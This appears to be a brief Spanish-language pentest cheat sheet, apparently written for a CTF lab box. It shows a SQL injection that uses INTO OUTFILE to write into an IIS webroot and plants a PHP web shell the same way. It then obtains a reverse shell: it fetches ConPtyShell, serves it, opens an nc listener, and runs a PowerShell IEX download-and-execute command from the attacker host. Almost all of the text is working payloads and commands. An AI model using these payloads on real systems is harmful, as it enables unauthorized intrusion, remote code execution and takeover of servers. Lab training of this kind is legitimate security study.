
---
**OUTPUT FILE EN RUTA PREDETERMINADA**

---
**SQLI OUTPUT FILE IIS**
```SQL
CREATE FILE
' union select 1,"test",3,4,5,6 into outfile "C:\\inetpub\\wwwroot\\prueba.txt"-- -
RESPONSE:   Error: SQLSTATE[HY000]: General error

CHECK FILE
' union select 1,"test",3,4,5,6 into outfile "C:\\inetpub\\wwwroot\\prueba.txt"-- -
RESPONSE:   Error: SQLSTATE[HY000]: General error: 1086 File 'C:\inetpub\wwwroot\prueba.txt' already exists	

❯ curl http://10.10.10.167/prueba.txt
1	test	3	4	5	6
```

---
**WEB SHELL**

---
**SQLI WEBSHELL IN OUTPUT FILE IIS
```SQL
CREATE PHP FILE
' union select 1,"<?php system($_REQUEST['cmd']);?>",3,4,5,6 into outfile "C:\\inetpub\\wwwroot\\pwned.php"-- -
RESPONSE:   Error: SQLSTATE[HY000]: General error

'
DESCARGAMOS ESTE ARCHIVO ARCHIVO.
❯ wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1

AGREGAMOS ESTA LINEA AL FINAL
Invoke-ConPtyShell -RemoteIp 10.10.16.5 -RemotePort 443 -Rows 41 -Cols 167

NOS PONEMOS EN ESCUCHA POR EL PUERTO 80
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

CON NMAP POR EL 443
❯ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...

PONEMOS ESTO
http://10.10.10.167/pwned.php?cmd=powershell%20IEX(New-Object%20Net.WebClient).downloadString(%27http://10.10.16.5/Invoke-ConPtyShell.ps1%27)

PS C:\inetpub\wwwroot>
```